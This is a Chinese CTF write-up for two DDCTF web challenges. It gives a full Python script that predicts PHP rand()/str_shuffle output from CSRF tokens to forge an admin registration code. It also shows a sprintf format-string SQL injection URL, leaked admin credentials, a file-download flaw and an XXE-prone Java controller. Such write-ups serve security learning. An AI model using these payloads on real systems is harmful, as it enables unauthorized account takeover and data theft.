-<p>&emsp;&emsp;根据提示能找到网站备份文件，下载后只有三个文件，从代码上并没有发现什么漏洞，而我们的目标是注册一个标志位是<code>admin</code>的账号，其本身存在的<code>admin</code>是个弱密码，但这个账号并没有admin的标志位，所以我们只能自己想办法注册一个。首先看看注册部分关键的代码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>] === <span class="hljs-string">"POST"</span>) &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'csrf'</span>]) <span class="hljs-keyword">and</span> (string)$_POST[<span class="hljs-string">'csrf'</span>] === $_SESSION[<span class="hljs-string">'csrf'</span>])) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"CSRF token error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $admin = <span class="hljs-string">"admin###"</span> . substr(str_shuffle(<span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>), <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);</span><br><span class="line">    $username = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) === <span class="hljs-keyword">true</span> &amp;&amp; $_POST[<span class="hljs-string">'username'</span>] !== <span class="hljs-string">''</span>) ? (string)$_POST[<span class="hljs-string">'username'</span>] : <span class="hljs-keyword">die</span>(<span class="hljs-string">'Missing username'</span>);</span><br><span class="line">    $password = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">true</span> &amp;&amp; $_POST[<span class="hljs-string">'password'</span>] !== <span class="hljs-string">''</span>) ? (string)$_POST[<span class="hljs-string">'password'</span>] : <span class="hljs-keyword">die</span>(<span class="hljs-string">'Missing password'</span>);</span><br><span class="line">    $code = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'code'</span>]) === <span class="hljs-keyword">true</span>) ? (string)$_POST[<span class="hljs-string">'code'</span>] : <span class="hljs-string">''</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> (strlen($username) &gt; <span class="hljs-number">32</span> || strlen($password) &gt; <span class="hljs-number">32</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid input'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="hljs-string">'SELECT username FROM users WHERE username = :username'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="hljs-string">':username'</span> =&gt; $username]);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> ($sth-&gt;fetch() !== <span class="hljs-keyword">false</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">'username has been registered'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>($code === $admin) &#123;</span><br><span class="line">        $identity = <span class="hljs-string">"admin"</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        $identity = <span class="hljs-string">"guest"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;可以看到我们只有让我们post的<code>$code</code>与<code>$admin</code>的值相等才能通过验证，而<code>$admin</code>的值又是经过<code>str_shuffle</code>随机打乱的<code>32</code>个字符。而<code>str_shuffle</code>的源码如下：</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/43.png" height="60%"><br></div><br>&emsp;&emsp;可以看到它使用了<code>rand()</code>作为随机数产生器，从而打乱字符顺序，而<code>rand()</code>产生的并不是<code>真的</code>随机数而是个伪随机数。我们可以通过下面的公式去预测第<code>32</code>位以后的随机数。<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP_RAND_MAX = <span class="hljs-number">2147483647</span></span><br><span class="line">num[n] = (num[n<span class="hljs-number">-3</span>] + num[n<span class="hljs-number">-31</span>]) mod (PHP_RAND_MAX)</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;当我们知道了生成的随机数我们就能预测出<code>str_shuffle</code>打乱的结果，最终在这道题中注册一个admin权限的账号。下面是payload：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">PHP_RAND_MAX = <span class="hljs-number">2147483647</span></span><br><span class="line">url = <span class="hljs-string">'http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php'</span></span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="hljs-comment"># num[n] = (num[n-3] + num[n-31]) mod (PHP_RAND_MAX)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RAND_RANGE</span><span class="hljs-params">(__n, __min, __max, __tmax)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> (__min) + int(((__max) - (__min) + <span class="hljs-number">1.0</span>) * ((__n) / ((__tmax) + <span class="hljs-number">1.0</span>)))</span><br><span class="line"><span class="hljs-comment"># 仿照PHP版的shuffle</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shuffle</span><span class="hljs-params">(strs, tokens)</span>:</span></span><br><span class="line">    lens = len(strs)</span><br><span class="line">    strs = list(strs)</span><br><span class="line">    n_left = lens</span><br><span class="line">    i = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">while</span> (n_left &gt; <span class="hljs-number">0</span>):</span><br><span class="line">        n_left -= <span class="hljs-number">1</span></span><br><span class="line">        rnd_idx = tokens[i]</span><br><span class="line">        i += <span class="hljs-number">1</span></span><br><span class="line">        rnd_idx = RAND_RANGE(rnd_idx, <span class="hljs-number">0</span> ,n_left, PHP_RAND_MAX)</span><br><span class="line">        <span class="hljs-keyword">if</span> (rnd_idx != n_left):</span><br><span class="line">            strs[rnd_idx], strs[n_left] = strs[n_left], strs[rnd_idx]</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(strs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):</span><br><span class="line">    html = sess.get(url)</span><br><span class="line">    context = html.content</span><br><span class="line">    soup = BeautifulSoup(context, <span class="hljs-string">'lxml'</span>)</span><br><span class="line">    csrf = soup.select(<span class="hljs-string">'#csrf'</span>)[<span class="hljs-number">0</span>].get(<span class="hljs-string">'value'</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> i == <span class="hljs-number">31</span>:</span><br><span class="line">        tmp = (num[i - <span class="hljs-number">3</span>] + num[i - <span class="hljs-number">31</span>]) % PHP_RAND_MAX</span><br><span class="line">        <span class="hljs-keyword">if</span> tmp == int(csrf):</span><br><span class="line">            print(<span class="hljs-string">'预测成功！'</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            print(<span class="hljs-string">'预测失败！'</span>)</span><br><span class="line">            exit(<span class="hljs-number">1</span>)</span><br><span class="line">    num.append(int(csrf))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 预测后面 62个</span></span><br><span class="line">tokens = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">94</span>):</span><br><span class="line">    tmp = (num[i - <span class="hljs-number">3</span>] + num[i - <span class="hljs-number">31</span>]) % PHP_RAND_MAX</span><br><span class="line">    num.append(int(tmp))</span><br><span class="line">    tokens.append(int(tmp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs = <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">code = shuffle(strs, tokens)[:<span class="hljs-number">32</span>]</span><br><span class="line">code = <span class="hljs-string">'admin###'</span> + code</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'预测code: '</span> + code)</span><br><span class="line">print(<span class="hljs-string">'预测csrf: '</span> + str(num[<span class="hljs-number">31</span>]))</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="hljs-comment"># 在访问第33次的时候CSRF应该是上一次的CSRF，也就是第32次，注意这里是从0开始</span></span><br><span class="line">    <span class="hljs-string">'csrf'</span>:num[<span class="hljs-number">31</span>], </span><br><span class="line">    <span class="hljs-string">'username'</span>:<span class="hljs-string">'junay'</span>,</span><br><span class="line">    <span class="hljs-string">'password'</span>:<span class="hljs-string">'123'</span>,</span><br><span class="line">    <span class="hljs-string">'code'</span>:code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html = sess.post(url, data)</span><br><span class="line">print(html.content)</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;上面的程序预测的时候有可能存在1/-1的误差，如果出现预测失败重新运行几次即可。</p>
-<p>&emsp;&emsp;有了账号后，我们就能登录，然后审计登录后的代码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// index.php 截取关键代码</span></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>]))&#123;</span><br><span class="line">    $id = addslashes($_GET[<span class="hljs-string">'id'</span>]);</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'title'</span>]))&#123;</span><br><span class="line">        $title = addslashes($_GET[<span class="hljs-string">'title'</span>]);</span><br><span class="line">        $title = sprintf(<span class="hljs-string">"AND title='%s'"</span>, $title);</span><br><span class="line">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        $title = <span class="hljs-string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = sprintf(<span class="hljs-string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($pdo-&gt;query($sql) <span class="hljs-keyword">as</span> $row) &#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h1&gt;"</span>.$row[<span class="hljs-string">'title'</span>].<span class="hljs-string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="hljs-string">'content'</span>];</span><br><span class="line">        <span class="hljs-keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;这个代码中使用了存在漏洞的<code>sprintf</code>函数，我们可以通过格式化漏洞绕过<code>addslashes</code>。在格式化的时候sprintf支持填充，我们可以使用<code>%1$&#39;</code>绕过反斜杠。</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/44.png" height="60%"><br></div><br>&emsp;&emsp;所以我们的payload就是：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&amp;title=Welcome%1$&apos; union select 1,f14g,3 from `key` limit 0,1 -- +</span><br></pre></td></tr></table></figure></p>
-<h2 id="喝杯Java冷静下"><a href="#喝杯Java冷静下" class="headerlink" title="喝杯Java冷静下"></a>喝杯Java冷静下</h2><p>&emsp;&emsp;首先能在源代码中找到账号密码：</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/45.png" height="60%"><br></div><br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 解开后</span><br><span class="line">admin: admin_password_2333_caicaikan</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;使用这个账号密码我们能登录进后台，在后台里我们可以发现一个<code>文件下载</code>的漏洞。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// url</span><br><span class="line">http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/rest/user/getInfomation?filename=informations/readme.txt</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;按照上次Java web的题目，我们开始找配置文件，比如：web.xml、applicationContext.xml等，但当我们找<code>class</code>文件时，却没有收获，但是匹配文件中的包名给我思路。</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/46.png" height="60%"><br></div><br>&emsp;&emsp;在<code>GitHub</code>上搜了一下，果然找到了这个框架。地址：<a href="https://github.com/Eliteams/quick4j" target="_blank">quick4j</a>。然后按照这个项目的路径我们就能找到关键的类，最终能找到的文件差不多如下：</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/47.png" height="50%"><br></div><br>&emsp;&emsp;标注的文件是控制文件，也是我们需要关注的文件，其内容如下：<br><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.eliteams.quick4j.web.controller;</span><br><span class="line"><span class="hljs-comment">// 删除了导入包</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@Controller</span></span><br><span class="line"><span class="hljs-meta">@RequestMapping</span>(&#123;<span class="hljs-string">"/user"</span>&#125;)</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String hintFile = <span class="hljs-string">"/flag/hint.txt"</span>;</span><br><span class="line">  <span class="hljs-meta">@Resource</span></span><br><span class="line">  <span class="hljs-keyword">private</span> UserService userService;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/login"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">login</span><span class="hljs-params">(@Valid User user, BindingResult result, Model model, HttpServletRequest request)</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      Subject subject = SecurityUtils.getSubject();</span><br><span class="line">      <span class="hljs-keyword">if</span> (subject.isAuthenticated()) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"redirect:/"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="hljs-keyword">if</span> (result.hasErrors())</span><br><span class="line">      &#123;</span><br><span class="line">        model.addAttribute(<span class="hljs-string">"error"</span>, <span class="hljs-string">"参数错误！"</span>);</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"login"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="hljs-keyword">if</span> ((user.getUsername().isEmpty()) || (user.getUsername() == <span class="hljs-keyword">null</span>) || </span><br><span class="line">        (user.getPassword().isEmpty()) || (user.getPassword() == <span class="hljs-keyword">null</span>)) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"login"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      subject.login(<span class="hljs-keyword">new</span> UsernamePasswordToken(user.getUsername(), user.getPassword()));</span><br><span class="line">      </span><br><span class="line">      User authUserInfo = <span class="hljs-keyword">this</span>.userService.selectByUsername(user.getUsername());</span><br><span class="line">      request.getSession().setAttribute(<span class="hljs-string">"userInfo"</span>, authUserInfo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">catch</span> (AuthenticationException e)</span><br><span class="line">    &#123;</span><br><span class="line">      model.addAttribute(<span class="hljs-string">"error"</span>, <span class="hljs-string">"用户名或密码错误 ！"</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"redirect:/"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/logout"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">logout</span><span class="hljs-params">(HttpSession session)</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    session.removeAttribute(<span class="hljs-string">"userInfo"</span>);</span><br><span class="line">    </span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    subject.logout();</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"login"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/admin"</span>&#125;, produces=&#123;<span class="hljs-string">"text/html;charset=UTF-8"</span>&#125;)</span><br><span class="line">  <span class="hljs-meta">@ResponseBody</span></span><br><span class="line">  <span class="hljs-meta">@RequiresRoles</span>(&#123;<span class="hljs-string">"admin"</span>&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">admin</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"拥有admin角色,能访问"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/create"</span>&#125;, produces=&#123;<span class="hljs-string">"text/html;charset=UTF-8"</span>&#125;)</span><br><span class="line">  <span class="hljs-meta">@ResponseBody</span></span><br><span class="line">  <span class="hljs-meta">@RequiresPermissions</span>(&#123;<span class="hljs-string">"user:create"</span>&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">create</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"拥有user:create权限,能访问"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/getInfomation"</span>&#125;, produces=&#123;<span class="hljs-string">"text/html;charset=UTF-8"</span>&#125;)</span><br><span class="line">  <span class="hljs-meta">@ResponseBody</span></span><br><span class="line">  <span class="hljs-meta">@RequiresRoles</span>(&#123;<span class="hljs-string">"guest"</span>&#125;)</span><br><span class="line">  <span class="hljs-keyword">public</span> ResponseEntity&lt;<span class="hljs-keyword">byte</span>[]&gt; download(HttpServletRequest request, String filename)</span><br><span class="line">    <span class="hljs-keyword">throws</span> IOException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> ((filename.contains(<span class="hljs-string">"../"</span>)) || (filename.contains(<span class="hljs-string">"./"</span>)) || (filename.contains(<span class="hljs-string">"..\\"</span>)) || (filename.contains(<span class="hljs-string">".\\"</span>))) &#123;</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String path = request.getServletContext().getRealPath(<span class="hljs-string">"/"</span>);</span><br><span class="line">    System.out.println(path);</span><br><span class="line">    </span><br><span class="line">    File file = <span class="hljs-keyword">new</span> File(path + File.separator + filename);</span><br><span class="line">    HttpHeaders headers = <span class="hljs-keyword">new</span> HttpHeaders();</span><br><span class="line">    </span><br><span class="line">    String downloadFielName = <span class="hljs-keyword">new</span> String(filename.getBytes(<span class="hljs-string">"UTF-8"</span>), <span class="hljs-string">"iso-8859-1"</span>);</span><br><span class="line">    </span><br><span class="line">    headers.setContentDispositionFormData(<span class="hljs-string">"attachment"</span>, downloadFielName);</span><br><span class="line">    </span><br><span class="line">    headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResponseEntity(FileUtils.readFileToByteArray(file), headers, HttpStatus.CREATED);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/nicaicaikan_url_23333_secret"</span>&#125;, produces=&#123;<span class="hljs-string">"text/html;charset=UTF-8"</span>&#125;)</span><br><span class="line">  <span class="hljs-meta">@ResponseBody</span></span><br><span class="line">  <span class="hljs-meta">@RequiresRoles</span>(&#123;<span class="hljs-string">"super_admin"</span>&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">xmlView</span><span class="hljs-params">(String xmlData)</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (xmlData.length() &gt;= <span class="hljs-number">1000</span>) &#123;</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"Too long~~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    </span><br><span class="line">    factory.setExpandEntityReferences(<span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      DocumentBuilder builder = factory.newDocumentBuilder();</span><br><span class="line">      </span><br><span class="line">      InputStream xmlInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(xmlData.getBytes());</span><br><span class="line">      </span><br><span class="line">      Document localDocument = builder.parse(xmlInputStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">catch</span> (ParserConfigurationException e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"ParserConfigurationException"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">catch</span> (SAXException e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"SAXException"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">catch</span> (IOException e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"IOException"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"ok~ try to read /flag/hint.txt"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;所以我们下一步就需要访问<code>nicaicaikan_url_23333_secret</code>，但是已经有的<code>admin</code>账号并不是<code>super_admin</code>，而且也没有注册账号的接口存在。这种情况下只能照着GitHub上的模板去翻其他文件，终于在<code>SecurityRealm.java</code>中找到了线索：</p>
-<p><div align="center"><br>    <img src="/images/posts/ddctf/48.png" height="60%"><br></div><br>&emsp;&emsp;这里注意到我们需要找到一个字符串的<code>hashCode()==0</code>，经过Google后，我们能在Stack Overflow找到一个答案：<code>f5a5a608</code>。</p>
